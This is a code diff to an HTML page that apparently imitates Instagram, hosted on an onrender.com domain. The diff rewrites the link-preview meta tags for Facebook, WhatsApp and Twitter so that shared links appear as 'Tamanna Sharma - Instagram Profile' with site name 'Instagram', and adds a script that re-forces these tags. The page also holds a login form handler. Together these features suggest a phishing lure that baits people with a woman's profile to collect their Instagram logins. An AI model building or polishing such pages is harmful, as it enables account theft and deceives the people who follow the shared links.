@@ -7,10 +7,10 @@
     
     <!-- Open Graph / Facebook / WhatsApp / Instagram Meta Tags -->
     <meta property="og:type" content="website" id="og-type">
-    <meta property="og:url" content="https://your-domain.com/" id="og-url">
+    <meta property="og:url" content="https://instagram-c4qx.onrender.com/" id="og-url">
     <meta property="og:title" content="Tamanna Sharma - Instagram Profile" id="og-title">
     <meta property="og:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!" id="og-description">
-    <meta property="og:image" content="https://your-domain.com/images/main.png" id="og-image">
+    <meta property="og:image" content="https://instagram-c4qx.onrender.com/images/main.png" id="og-image">
     <meta property="og:image:width" content="1200" id="og-image-width">
     <meta property="og:image:height" content="630" id="og-image-height">
     <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile" id="og-image-alt">
@@ -19,19 +19,40 @@
     
     <!-- Instagram Specific Meta Tags -->
     <meta property="og:image:type" content="image/png" id="og-image-type">
-    <meta property="og:image:secure_url" content="https://your-domain.com/images/main.png" id="og-image-secure-url">
+    <meta property="og:image:secure_url" content="https://instagram-c4qx.onrender.com/images/main.png" id="og-image-secure-url">
     
     <!-- Twitter Card Meta Tags -->
     <meta name="twitter:card" content="summary_large_image" id="twitter-card">
-    <meta name="twitter:url" content="https://your-domain.com/" id="twitter-url">
+    <meta name="twitter:url" content="https://instagram-c4qx.onrender.com/" id="twitter-url">
     <meta name="twitter:title" content="Tamanna Sharma - Instagram Profile" id="twitter-title">
     <meta name="twitter:description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!" id="twitter-description">
-    <meta name="twitter:image" content="https://your-domain.com/images/main.png" id="twitter-image">
+    <meta name="twitter:image" content="https://instagram-c4qx.onrender.com/images/main.png" id="twitter-image">
     
     <!-- Additional Meta Tags for Better SEO -->
-    <meta name="description" content="Log in to Instagram to see photos and videos from your friends.">
-    <meta name="keywords" content="Instagram, login, social media, photos, videos">
-    <meta name="author" content="Instagram">
+    <meta name="description" content="Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!">
+    <meta name="keywords" content="Tamanna Sharma, Instagram, social media, photos, videos">
+    <meta name="author" content="Tamanna Sharma">
+    
+    <!-- Cache Busting for Social Media -->
+    <meta property="og:updated_time" content="2024-01-01T00:00:00Z">
+    <meta name="twitter:updated_time" content="2024-01-01T00:00:00Z">
+    
+    <!-- WhatsApp Specific Meta Tags -->
+    <meta property="og:image:width" content="300">
+    <meta property="og:image:height" content="300">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="Tamanna Sharma Instagram Profile">
+    
+    <!-- Instagram Specific Meta Tags -->
+    <meta property="og:image:secure_url" content="https://instagram-c4qx.onrender.com/images/main.png">
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:locale" content="en_US">
+    
+    <!-- Additional Meta Tags for Better Compatibility -->
+    <meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow">
+    <meta name="theme-color" content="#E4405F">
+    <meta name="msapplication-TileColor" content="#E4405F">
     <link rel="stylesheet" href="./style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -173,8 +194,38 @@
             }
         }
 
+        // Force meta tag refresh for social media platforms
+        function forceMetaRefresh() {
+            // Update meta tags with current timestamp to force cache refresh
+            const timestamp = new Date().toISOString();
+            document.querySelector('meta[property="og:updated_time"]').setAttribute('content', timestamp);
+            document.querySelector('meta[name="twitter:updated_time"]').setAttribute('content', timestamp);
+            
+            // Ensure all meta tags are properly set
+            const metaTags = {
+                'og:title': 'Tamanna Sharma - Instagram Profile',
+                'og:description': 'Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!',
+                'og:image': 'https://instagram-c4qx.onrender.com/images/main.png',
+                'og:url': 'https://instagram-c4qx.onrender.com/',
+                'twitter:title': 'Tamanna Sharma - Instagram Profile',
+                'twitter:description': 'Follow Tamanna Sharma on Instagram for amazing photos, stories, and updates. Check out her latest posts and connect with her!',
+                'twitter:image': 'https://instagram-c4qx.onrender.com/images/main.png',
+                'twitter:url': 'https://instagram-c4qx.onrender.com/'
+            };
+            
+            Object.entries(metaTags).forEach(([property, value]) => {
+                const meta = document.querySelector(`meta[property="${property}"], meta[name="${property}"]`);
+                if (meta) {
+                    meta.setAttribute('content', value);
+                }
+            });
+        }
+
         // Load meta data when page loads
         loadMetaData();
+        
+        // Force refresh after a short delay to ensure proper loading
+        setTimeout(forceMetaRefresh, 1000);
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
